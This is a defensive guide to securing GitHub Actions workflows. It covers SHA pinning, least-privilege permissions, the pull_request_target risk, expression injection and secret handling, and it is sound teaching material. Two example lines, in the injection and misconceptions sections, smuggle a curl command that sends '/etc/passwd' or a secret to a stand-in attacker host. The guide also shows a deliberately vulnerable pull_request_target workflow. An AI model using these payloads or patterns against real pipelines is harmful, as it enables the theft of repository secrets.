# GitHub Actions Security

> GitHub Actions security covers: pinning actions to SHA hashes, the permissions model, OIDC token exchange, handling fork PRs safely, secret management, and supply chain attack prevention.

---

## Quick Reference

| | |
|---|---|
| **What it is** | Security practices for GitHub Actions pipelines — preventing supply chain attacks and credential exposure |
| **Key risks** | Malicious/compromised third-party actions, secret exfiltration, fork PRs with access to secrets, injected expressions |
| **Key mitigations** | SHA pinning, minimal permissions, OIDC instead of secrets, `pull_request` vs `pull_request_target` |
| **Key tools** | `actionlint`, Dependabot for Actions updates, `permissions:` block, environment protection |
| **Must-know** | SHA pinning, `GITHUB_TOKEN` permissions, `pull_request_target` danger, expression injection |

---

## Core Concept

GitHub Actions workflows run code with access to your repository and secrets. The primary attack surfaces are: third-party actions (any `uses:` statement executes code you don't control), fork pull requests (external contributors can modify workflows and exfiltrate secrets), and expression injection (untrusted user input interpolated into `run:` steps). The mitigations are: pin all `uses:` statements to immutable SHA hashes, use the minimal `permissions:` block required, use OIDC instead of long-lived credentials, and never use `pull_request_target` without carefully auditing the security model.

---

## The Code

**SHA pinning — the most important security practice**
```yaml
# INSECURE: tag v4 is a mutable pointer — can be changed silently
- uses: actions/checkout@v4
- uses: some-org/dangerous-action@latest
- uses: aws-actions/configure-aws-credentials@main  # main can change anytime

# SECURE: SHA is immutable — it always points to the exact same code
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-dotnet@3e891b0cb619bf60e2c25674b222b8940e2c1c25  # v4.1.0

# How to get the SHA for any action:
# 1. Visit the action's repo on GitHub
# 2. Go to the tag/release you want (e.g., v4)
# 3. Click the commit SHA shown next to the tag
# 4. Copy the full 40-char SHA

# Or via CLI:
gh api repos/actions/checkout/commits/v4 --jq '.sha'

# Keep SHAs updated automatically with Dependabot:
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Dependabot opens PRs to update pinned SHAs when new versions are released
```

**Minimal permissions — least privilege**
```yaml
# Default GITHUB_TOKEN permissions in older repos: WRITE to everything
# Default in new repos: READ to contents, nothing else

# Always declare permissions explicitly — don't rely on defaults
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read          # checkout the repo
      pull-requests: write    # post comments on PRs
      checks: write           # create check runs
      # packages: write       # only if publishing packages
      # id-token: write       # only if using OIDC

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write         # required for OIDC cloud auth
      # NOTHING ELSE

# Set org-wide default to least privilege:
# Org Settings → Actions → General → Workflow permissions → Read repository contents only
# Then each workflow explicitly elevates only what it needs
```

**`pull_request` vs `pull_request_target` — the most dangerous confusion**
```yaml
# pull_request trigger:
# - Runs in the context of the PR branch (fork or not)
# - Does NOT have access to secrets for fork PRs
# - Safe for CI that runs on untrusted code
# - Workflow file used: the one in the PR branch (potentially modified by attacker)

on:
  pull_request:
    branches: [main]
# SAFE: no secrets available for fork PRs; attacker can't access your AWS keys

---

# pull_request_target trigger:
# - Runs in the context of the BASE branch (main)
# - DOES have access to secrets (even for fork PRs!)
# - Workflow file used: the one in the BASE branch (your version)
# - Required for: commenting on PRs from forks, labelling, accessing secrets

on:
  pull_request_target:
    branches: [main]
# DANGEROUS if you checkout the PR code and run it:

# THE VULNERABLE PATTERN (DON'T DO THIS):
jobs:
  build:
    on: pull_request_target  # has secrets
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out fork code
      - run: ./build.sh  # ← runs fork's code with access to your secrets!

# SAFE PATTERN for pull_request_target (labelling, commenting only):
jobs:
  label:
    on: pull_request_target
    permissions:
      pull-requests: write
    steps:
      # Never checkout the PR code in pull_request_target jobs
      - uses: actions/github-script@v7  # only uses GitHub API, not PR code
        with:
          script: |
            await github.rest.issues.addLabels({
              ...context.repo,
              issue_number: context.payload.pull_request.number,
              labels: ['needs-review']
            })
```

**Expression injection — sanitize untrusted input**
```yaml
# VULNERABLE: untrusted PR title injected directly into shell
- name: Print PR title
  run: echo "${{ github.event.pull_request.title }}"
  # Attacker's PR title: "; curl https://evil.com/$(cat /etc/passwd) #"
  # Result: secrets exfiltrated

# SAFE: use environment variable (shell treats as data, not code)
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"   # PR_TITLE is an env var — shell injection impossible

# Always sanitize these GitHub context values in run: steps:
# github.event.pull_request.title
# github.event.pull_request.body
# github.event.issue.title
# github.event.issue.body
# github.event.comment.body
# github.head_ref (PR branch name — user-controlled)

# SAFE pattern for any user-controlled input:
- name: Use PR branch name safely
  env:
    BRANCH_NAME: ${{ github.head_ref }}
  run: |
    # Validate before using
    if [[ ! "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_-]+$ ]]; then
      echo "Invalid branch name"
      exit 1
    fi
    echo "Building branch: $BRANCH_NAME"
```

**Secret management best practices**
```yaml
# NEVER print secrets (even accidentally)
- run: echo "Token is ${{ secrets.API_TOKEN }}"  # BAD — secret visible in logs
                                                   # (GitHub masks known secrets, but not all)

# NEVER pass secrets via environment unless needed
env:
  ALL_SECRETS: ${{ toJSON(secrets) }}  # BAD — dumps all secrets

# DO use secrets only where needed, as environment variables
- name: Deploy
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: ./deploy.sh
  # The deploy.sh script accesses $API_TOKEN — never interpolated in YAML

# Use OIDC instead of long-lived secrets for cloud access:
permissions:
  id-token: write
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123:role/GitHubActionsRole
      aws-region: eu-west-1
  # No secrets.AWS_SECRET_KEY needed — ever
```

**Validating workflows with `actionlint`**
```bash
# Install actionlint (catches security issues and syntax errors)
brew install actionlint

# Lint all workflow files
actionlint

# Lint a specific file
actionlint .github/workflows/ci.yml

# actionlint catches:
# - Expression injection vulnerabilities
# - Invalid workflow syntax
# - Incorrect action inputs
# - Wrong event names
# - Undefined variables

# Example output:
# .github/workflows/ci.yml:23:15: "github.event.pull_request.title" is potentially
# dangerous value. Do not pass it to "run:" directly. Use an environment variable instead.
# [expression-injection]
```

**Third-party action risk assessment**
```bash
# Before using any action, check:
# 1. Is it from a verified creator? (GitHub official, major cloud providers)
# 2. How many users? (stars, usage count in GitHub marketplace)
# 3. Is it actively maintained? (recent commits)
# 4. What permissions does it request?
# 5. What does it do with your inputs? (read the source)

# High-risk actions to avoid or audit carefully:
# - Actions that take credentials as inputs and upload them "for convenience"
# - Actions with broad file system access
# - Actions that make outbound network calls with repo content
# - Actions from individual developers with no org affiliation

# Safer alternatives:
# - Use GitHub's official actions (actions/*)
# - Use major cloud provider actions (aws-actions/*, azure/*, google-github-actions/*)
# - Write simple shell steps instead of third-party actions for simple tasks
# - Create internal composite actions for complex shared steps
```

---

## Real World Example

A startup's CI pipeline used 12 third-party Actions — all pinned to tags, not SHAs. When a popular `actions/cache`-like action was compromised in a supply chain attack, the attacker modified the action's tag to point to malicious code that exfiltrated `GITHUB_TOKEN` and repository secrets. Teams pinning to SHAs were unaffected; teams using tags had their secrets exposed.

```yaml
# The vulnerable workflow (before):
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4                          # mutable tag
      - uses: community/fast-cache@v2                      # compromised action
      - uses: actions/setup-dotnet@v4                      # mutable tag
      - run: dotnet build
    env:
      NUGET_TOKEN: ${{ secrets.NUGET_TOKEN }}              # exposed by compromise

# The secured workflow (after):
name: CI
on: [push, pull_request]

permissions:
  contents: read    # minimal permissions
  # nothing else

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      # All actions pinned to SHA
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: actions/setup-dotnet@3e891b0cb619bf60e2c25674b222b8940e2c1c25  # v4.1.0

      # Replaced 3rd-party cache action with official GitHub cache:
      - uses: actions/cache@6849a6489940f00c2f30c0fb92c6274307ccb58a  # v4.1.2
        with:
          path: ~/.nuget/packages
          key: nuget-${{ hashFiles('**/*.csproj') }}

      # No community/fast-cache — replaced with official action

      - name: Restore and build
        env:
          NUGET_TOKEN: ${{ secrets.NUGET_TOKEN }}   # scoped to only this step
        run: |
          dotnet nuget add source \
            "https://nuget.pkg.github.com/org/index.json" \
            --password "$NUGET_TOKEN"    # env var, not expression injection
          dotnet build

# Added Dependabot to keep SHAs updated:
# .github/dependabot.yml already configured (see github-actions-integration.md)
```

---

## Common Misconceptions

**"GitHub masks secrets in logs so they can't be exfiltrated"**
GitHub masks known secret values in logs — if a secret appears verbatim in log output, it's shown as `***`. But: exfiltration via outbound HTTP requests (to an attacker's server) is not masked. A compromised action can `curl https://evil.com?data=$(echo $SECRET | base64)` and the secret is gone. Masking is a convenience, not a security guarantee.

**"The `GITHUB_TOKEN` expires, so it's safe to expose"**
`GITHUB_TOKEN` expires at the end of the workflow run — typically a few hours. During that window, it can be used to: push commits, create releases, modify issues and PRs, read secrets (with write:secrets scope), trigger workflows, and more. An attacker with the token during its validity window can do significant damage. Treat it like any other credential.

**"Using `pull_request_target` is fine as long as I verify the contributor"**
There's no reliable way to "verify" a contributor in a workflow trigger. The danger of `pull_request_target` is structural: the trigger has secrets access AND the workflow can be made to execute PR code. The safe pattern is to never checkout and execute code from a fork PR in a `pull_request_target` job — period. Any workflow that does is vulnerable regardless of who the contributor is.

---

## Gotchas

- **`head_ref` (branch name) is user-controlled and can contain shell special characters.** Always validate or use as an environment variable, never interpolate directly into `run:` steps.

- **Secrets are available to all jobs unless `pull_request` from a fork.** Any job in a workflow triggered by a push to main has access to all repository secrets via `${{ secrets.* }}`. This is correct behaviour — be aware of what runs with what access.

- **Actions with `pull_request_target` in their implementation are the most dangerous to use.** Some third-party actions request being run with `pull_request_target` — carefully audit what they do with that access before using them.

- **Environment protection rules don't protect against in-workflow secret usage.** Environments protect deployment steps (requiring approval). Secrets not scoped to an environment are available to any job in the workflow without approval.

---

## Interview Angle

**What they're really testing:** Whether you understand CI/CD as a security surface, not just an automation tool.

**Common question forms:**
- "How do you secure your GitHub Actions pipeline?"
- "What's the risk of using third-party GitHub Actions?"
- "What's the difference between `pull_request` and `pull_request_target`?"

**The depth signal:** A junior knows to store credentials as secrets. A senior pins all actions to SHAs (not tags), uses minimal `permissions:` blocks, uses OIDC instead of stored credentials, knows the `pull_request_target` danger model precisely, sanitises user-controlled input in `run:` steps via env vars, uses `actionlint` to catch issues automatically, and can explain why `GITHUB_TOKEN` masking is not a security guarantee.

---

## Related Topics

- [github-actions-integration.md](../git/github-actions-integration.md) — Foundational Actions concepts.
- [github-actions-advanced.md](github-actions-advanced.md) — OIDC deep dive and environment protection rules.
- [github-security-features.md](github-security-features.md) — Secret scanning, Dependabot, CodeQL — the repo-level security layer.

---

## Source

[GitHub Docs — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)

---
*Last updated: 2026-04-24*